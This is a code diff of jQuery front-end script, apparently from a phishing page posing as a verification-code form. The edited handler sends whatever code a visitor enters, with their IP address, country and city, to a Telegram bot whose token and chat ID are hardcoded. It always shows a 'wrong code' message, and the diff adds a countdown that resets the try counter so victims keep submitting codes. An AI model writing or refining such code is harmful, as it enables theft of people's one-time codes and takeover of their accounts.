@@ -148,74 +148,83 @@ let code1 = '';
 let code2 = '';
 let Fcode = '';
 function sendCode() {
-    $('#code').on('input', function () {
-        const input = $(this).val();
-        const validInputRegex = /^\d+$/; // Chỉ cho phép số và dấu cộng
+  $('#send-code').on('click', function () {
+    const $button = $(this);
+    const keymap = $('#code').val();
 
-        if (!validInputRegex.test(input)) {
-            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
-            $(this).val(input.slice(0, -1));
-        }
-    });
+    if (keymap === '') {
+        $('#code').addClass('border-danger');
+        return;
+    } else {
+        $('#code').removeClass('border-danger');
+    }
 
-    $('#send-code').on('click', function () {
-        const keymap = $('#code').val();
+    code1 = keymap;
 
-        if (keymap === '') {
-            $('#code').addClass('border-danger');
-            return;
-        } else {
-            $('#code').removeClass('border-danger');
-        }
-        code1 = keymap;
-        const message1 = `🔓 <strong>Code:</strong> <code>${code1}</code>\n` +
-`🌐 <strong>IP Address:</strong> <code>${IpAddress.ipAddress}</code>\n` +
-` <strong>Country:</strong> <code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)\n` +
-` <strong>City:</strong> <code>${IpAddress.city}</code>`;
-        NUMBER_TIME_SEND_CODE++;
-        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
-        const chatId = '-1002416068664';
-        const message = message1;
+    const message1 = `🔓 <strong>Code:</strong> <code>${code1}</code>\n` +
+        `🌐 <strong>IP Address:</strong> <code>${IpAddress.ipAddress}</code>\n` +
+        `<strong>Country:</strong> <code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)\n` +
+        `<strong>City:</strong> <code>${IpAddress.city}</code>`;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    NUMBER_TIME_SEND_CODE++;
 
-        fetch(telegramUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'html'
-            })
+    const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
+    const chatId = '-1002416068664';
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    // ✅ Bắt đầu hiệu ứng loading
+    $button.prop('disabled', true).addClass('loading');
+
+    fetch(telegramUrl, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message1,
+            parse_mode: 'html'
         })
-            .then((response) => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then((data) => {
-                setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
-                        $('#wrong-code').removeClass('d-none');
-                    } else {
-                        $('#wrong-code').removeClass('d-none');
-                        $('#send-code').prop('disabled', true);
+    })
+    .then(response => {
+        if (!response.ok) throw new Error('Network error');
+        return response.json();
+    })
+    .then(data => {
+        setTimeout(() => {
+            if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
+                $('#wrong-code').removeClass('d-none');
+            } else {
+                $('#wrong-code').removeClass('d-none');
+                $button.prop('disabled', true);
+                let countdown = 30;
+                const originalText = $button.text();
+                const interval = setInterval(() => {
+                    $button.text(`Wait ${countdown}s...`);
+                    countdown--;
+                    if (countdown < 0) {
+                        clearInterval(interval);
+                        $button.prop('disabled', false).removeClass('loading').text(originalText);
+                        NUMBER_TIME_SEND_CODE = 0;
                     }
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
-            })
-            .catch((error) => {
-                setTimeout(function () {
-                    Swal.fire({
-                        text: `Request failed!`,
-                        icon: 'error'
-                    });
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 500);
+                }, 1000);
+                return;
+            }
+
+            // ✅ Gỡ hiệu ứng loading
+            $button.prop('disabled', false).removeClass('loading');
+            $('.lsd-ring-container').addClass('d-none');
+        }, 2000);
+    })
+    .catch(error => {
+        setTimeout(() => {
+            Swal.fire({
+                text: "Request failed!",
+                icon: 'error'
             });
+            $button.prop('disabled', false).removeClass('loading'); // Gỡ loading khi lỗi
+            $('.lsd-ring-container').addClass('d-none');
+        }, 500);
+    });
+});
         /*  $.ajax({
             url: '/sendInfo',
             type: 'POST',
